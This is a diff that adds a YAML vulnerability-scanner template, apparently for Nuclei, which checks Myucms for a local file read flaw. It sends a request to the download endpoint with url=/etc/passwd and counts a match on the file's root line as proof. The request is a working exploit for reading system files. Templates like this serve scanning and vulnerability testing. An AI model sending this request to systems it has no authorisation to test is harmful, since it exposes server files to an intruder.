@@ -1,0 +1,20 @@
+id: poc-yaml-myucms-lfr
+info:
+  name: Myucms Local File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Myucms Local File Read vulnerability allows attackers to read arbitrary files on the server.
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
